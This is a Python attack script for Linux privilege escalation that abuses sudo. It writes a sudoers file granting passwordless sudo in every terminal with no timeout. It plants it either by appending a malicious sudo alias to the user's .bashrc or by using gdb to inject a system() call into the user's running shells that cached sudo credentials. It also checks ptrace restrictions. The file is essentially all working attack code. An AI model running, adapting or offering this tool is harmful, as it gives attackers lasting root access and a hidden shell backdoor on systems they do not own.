#!/usr/bin/python3
# no be bad with script

import os 
import sys
import getpass
import argparse
import subprocess
from shutil import which

def gen_break_ticket_payload(disk_location):
    ''' The program generates a default payload to turn off tty tickets, this will enable a sudo session to escape the 
        jailed terminal a user ran the sudo command in.  Next the payload will turn off the timeout limits that sudo can 
        be run as long as they would like without a password
    '''   
    payload = "Defaults !tty_tickets"+"\n"
    payload += "Defaults timestamp_timeout=-1"+"\n"
    
    try:
        with open(disk_location,'w') as f:
            f.write(payload)
    except:
        print('Error writing payload')


def get_pids():   
    blacklist_pid = str(os.getppid())
    if not check_bin('pgrep'):
       print("no pgrep - havent switched to regex")
       sys.exit()
    pgrep = subprocess.Popen('pgrep \'^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$\' -u \"$(id -u)\"',
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = pgrep.communicate()
    pids = out.decode("utf-8").split('\n')[:-1]
    if pids: 
        pids.remove(blacklist_pid)
    return pids


def ptrace_check():
    """ This checks if yama ptrace or selinux are set to block ptrace in linux """
    ptrace_scope = '/proc/sys/kernel/yama/ptrace_scope'
    if os.path.exists(ptrace_scope):
        with open(ptrace_scope) as f:
            value = int(f.read().strip())
        if value == 0:  
           return True
        else:    
            print("WARNING: ptrace is disabled. Injection will not work.")
            print("It can be enabled by running the following:")
            print("echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope")
            print("But you wouldn't be trying to inject if you could sudo ;)")
        return False
    else:
        getsebool = '/usr/sbin/getsebool'
        if os.path.exists(getsebool):
            p = subprocess.Popen([getsebool, 'deny_ptrace'],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = p.communicate()
            if str(out) != 'deny_ptrace --> on\n':
                    return True
            else:    
                print("WARNING: ptrace is disabled. Injection will not work.")
                print("It can be enabled by running the following:")
                print("sudo setsebool -P deny_ptrace=off")
                print("But you wouldn't be trying to inject if you could sudo ;)")
            return False   


def backdoor_rc(payload, sudofile):
    backdoor_line = 'alias sudo=\"\sudo cp {} /etc/sudoers.d/{} 2>&1; \sudo"'.format(payload, sudofile)
    home = os.path.expanduser("~")
    bashrc = "{}/.bashrc".format(home)
    print("Backdooring {}".format(bashrc))
    try:
        with open(bashrc,'a') as f:
            f.write(backdoor_line)
            print(backdoor_line)
        print('bashrc backdoored')
    except:
        print('failed to write rc')


def check_bin(bin):
    """Check if `bin` is in PATH and executable."""
    result = which(bin)
    if result is None:
        print("The program {} could not be found in your file path").format(bin)
        print("You may want to update your path if you know it to exist")
    return result is not None


def inject(payload,pid,sudofile):
    if not check_bin('gdb'):
       sys.exit()
    
    if not ptrace_check():
        sys.exit() 
    
    pids = []
    if not pid:
        pids = get_pids()    
    else:
        pids.append(pid)
     
    inject_payload = "-eval-command=\'call system(\"echo | sudo -S cp {} /etc/sudoers.d/{} 2>&1\")\'".format(payload, sudofile) 
    for x in pids:
        gdb_line = 'gdb -q -n -p {} -batch {} >/dev/null 2>&1'.format(x , inject_payload)  
        print("Attempting to inject into: {}".format(x))   
        p = subprocess.Popen(gdb_line,
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
    os.unlink(payload)


def main(args):
    
    if not os.path.isfile(args.payload):
        gen_break_ticket_payload(args.payload)
    
    # backdoor the rc file of the current user so the next 
    # time they run sudo 
    if args.b:  
        backdoor_rc(args.payload,args.f)
    
    # backdoor the rc file of the current user so the next 
    if args.i:
        inject(args.payload,args.p,args.f)
 


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='A script to take advantage of Sudo')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-b', action="store_true", default=False, help="backdoor bashrc to launch payload as sudo next time")
    group.add_argument('-i', action="store_true", default=False, help="try to inject into a running sudo process and run a privileged command")
    parser.add_argument('-d', action="store_true", default=False, help="payload that will allow you to sudo with no passwd in any terminal forever")
    parser.add_argument('-p', action="store", default=None, help="pid that ran sudo - to be used with -i, otherwise will bruteforce shells")
    parser.add_argument('--payload', action="store", default='/tmp/Temp-49733d70-30fb-9402-0b0c187a1eba', help="location of payload on disk to run")
    parser.add_argument('-f', action="store", default='win', help="optional name for file created in sudoers.d from payload created by -d")
    args = parser.parse_args()
    main(args)